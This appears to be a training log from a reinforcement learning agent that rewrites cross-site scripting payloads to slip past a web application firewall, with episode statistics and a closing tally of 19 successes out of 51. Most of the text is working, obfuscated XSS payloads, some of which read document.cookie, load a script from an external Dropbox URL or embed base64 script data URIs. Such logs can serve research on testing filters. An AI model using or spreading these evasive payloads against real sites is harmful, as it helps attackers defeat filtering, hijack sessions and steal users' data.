+ 81/100: episode: 17, duration: 0.015s, episode steps: 3, steps per second: 199, episode reward: 10.000, mean reward: 3.333 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.201 [0.000, 52.000], loss: 4.072126, mean_absolute_error: 0.876434, mean_q: 0.690458
+reset current_sample=\\";alert('XSS');//
+current sample:\\";alert('XSS');//
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:\\";a lert('XSS');//
+ 82/100: episode: 18, duration: 0.008s, episode steps: 1, steps per second: 126, episode reward: 10.000, mean reward: 10.000 [10.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.082 [0.000, 20.000], loss: 12.334345, mean_absolute_error: 1.392375, mean_q: 0.827887
+reset current_sample=<iframe src=http://ha.ckers.org/scriptlet.html <
+current sample:<iframe src=http://ha.ckers.org/scriptlet.html <
+action is addZero
+Do action :addZero
+current sample:<ifram e src=http://ha.ck ers.org/scriptl et.html <
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:<ifram e sr c=http://ha. ck ers.org/s criptl et.html <
+ 84/100: episode: 19, duration: 0.010s, episode steps: 2, steps per second: 191, episode reward: 10.000, mean reward: 5.000 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.208 [0.000, 54.000], loss: 11.134104, mean_absolute_error: 1.269006, mean_q: 0.673799
+reset current_sample=<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+current sample:<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<TA BLE><TD  BACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<TA BL E><TD  BACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T A BL E><TD  B ACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T A BL E><TD  B A CKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T A BL E><T D  B A CKGROUN D="javascript:alert('XSS')">
+action is addTab
+Do action :addTab
+current sample:<T A BL E><T    D  B A CKGROUN    D="javascript:alert('XSS')">
+action is addEnter
+Do action :addEnter
+current sample:<T A B
+L E><T    D  B A CKGROUN    D="javascript:alert('XSS')">
+action is addEnter
+Do action :addEnter
+current sample:<T A B
+L E><T    
+D  B A CKGROUN    
+D="javascript:alert('XSS')">
+action is addEnter
+Do action :addEnter
+current sample:<T A B
+L E><T    
+D  B A CKGROUN    
+D="j
+av
+ascript:
+alert('XSS')">
+action is addComment
+Do action :addComment
+current sample:<T A B
+L E><T    
+D  B A CK/*8888*/GROUN    
+D="j
+av
+ascript:
+alert('XSS')">
+action is addComment
+Do action :addComment
+current sample:<T A B/*8888*/
+L E><T    
+D  B/*8888*/ A CK/*8888*/GROUN    
+D="j
+av
+ascript:
+alert('XSS')">
+action is addComment
+Do action :addComment
+current sample:<T A B/*8888*/
+L E><T    
+D  B/*8888*/ A CK/*8888*/GROUN    
+D="j
+av
+ascri/*8888*/pt:
+alert('XSS')">
+action is addComment
+Do action :addComment
+current sample:<T A B/*8888*//*8888*/
+L E><T    
+D  B/*8888*//*8888*/ A CK/*8888*/GROUN    
+D="j
+av
+ascri/*8888*/pt:
+alert('XSS')">
+action is addComment
+Do action :addComment
+current sample:<T A B/*8888*//*8888*/
+L E><T    
+D/*8888*/  B/*8888*//*8888*/ A CK/*8888*/GROUN    
+D/*8888*/="j
+av
+ascri/*8888*/pt:
+alert('XSS')">
+action is addComment
+Do action :addComment
+current sample:<T A B/*8888*//*8888*//*8888*/
+L E><T    
+D/*8888*/  B/*8888*//*8888*//*8888*/ A CK/*8888*/GROUN    
+D/*8888*/="j
+av
+ascri/*8888*/pt:
+alert('XSS')">
+action is addComment
+Do action :addComment
+done, took 1.691 seconds
+Do action :addComment
+Do action :addComment
+<style/*8888*/><im/*8888*/g src="</style/*8888*/><im/*8888*/g src=x one/*8888*/rror=ale/*8888*/rt(XSS)//">
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<img src=asdf one/*8888*/rror=ale/*8888*/rt(docume/*8888*/nt.cookie/*8888*/)>
+Do action :addTab
+Do action :addTab
+Do action :addTab
+Do action :addComment
+<obje/*8888*/ct data="data:te/*8888*/xt/html;base/*8888*/64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+Do action :addComment
+Do action :addComment
+Do action :addTab
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<ScRi/*8888*/pT 5-0*3+9/3=>pro/*8888*/mpt(1)</ScRi/*8888*/pT gi/*8888*/veanswerhere=?
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addTab
+<META HTTP-EQUIV="r   efr   esh" CONTENT="0;url=data:t   ext/html;bas   e64,PHNjc/*8888*/mlwdD5hbGVydCgnWFNTJyk8L3Njc/*8888*/mlwdD4K">
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<i/*8888*/nput value=<><i/*8888*/fram/*8888*/e/src=javascri/*8888*/pt:confi/*8888*/rm/*8888*/(1)
+Do action :addComment
+<h1><font col/*8888*/or=bl/*8888*/ue>hel/*8888*/l/*8888*/ox worl/*8888*/dss</h1>
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<math><a xlin/*8888*/k:href="//jsfiddle.n/*8888*/et/t846h/">click
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<style/*8888*/><img src="</style/*8888*/><img src=x on/*8888*/e/*8888*/rror=ale/*8888*/rt(123)//">
+Do action :addComment
+Do action :addTab
+Do action :addTab
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<sc/*8888*/ript>+-+-1-+-+al/*8888*/ert(1)</sc/*8888*/ript>
+Do action :addComment
+Do action :addComment
+<embed src/*8888*/="ja/*8888*/va/*8888*/sc/*8888*/ript:a/*8888*/lert(1)">
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<math/*8888*/><a xlink:h/*8888*/ref="//jsfiddle.net/t846h/*8888*//">click
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<di/*8888*/v/style="wi/*8888*/dth:exp/*8888*/ressi/*8888*/on(confi/*8888*/rm(1))">X</di/*8888*/v> {IE7}
+Do action :addComment
+Do action :addComment
+Do action :addTab
+Do action :addComment
+Do action :addComment
+//|\\ <sc/*8888*/ript //|\\ src/*8888*/='https://d/*8888*/l.d/*8888*/ropbox.c/*8888*/om/u/13018058/js.js'> //|\\ </sc/*8888*/ript //|\\
+Do action :addComment
+Do action :addComment
+<div/o/*8888*/nmo/*8888*/use/*8888*/o/*8888*/ve/*8888*/r='ale/*8888*/rt(1)'> style/*8888*/="x:">
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<e/*8888*/mbe/*8888*/d src="data:te/*8888*/xt/html;base/*8888*/64,P/*8888*/HNjcmlwdD5hbGVydCgxKTwvc2NyaXB0P/*8888*/g==">
+Do action :addComment
+Do action :addComment
+<img src="/" =_=" title="on/*8888*/error='p/*8888*/romp/*8888*/t(1)'">
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addTab
+Do action :addTab
+Do action :addComment
+<input onb/*8888*/lur=write(XSS) autofocus><input autofocus>
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addTab
+Do action :addTab
+Do action :addTab
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addComment
+<ScRi/*8888*/Pt>al/*8888*/ert(1)</sCri/*8888*/Pt>
+Do action :addComment
+Do action :addComment
+Do action :addComment
+Do action :addTab
+Do action :addTab
+Do action :addTab
+Sum:51 Success:19
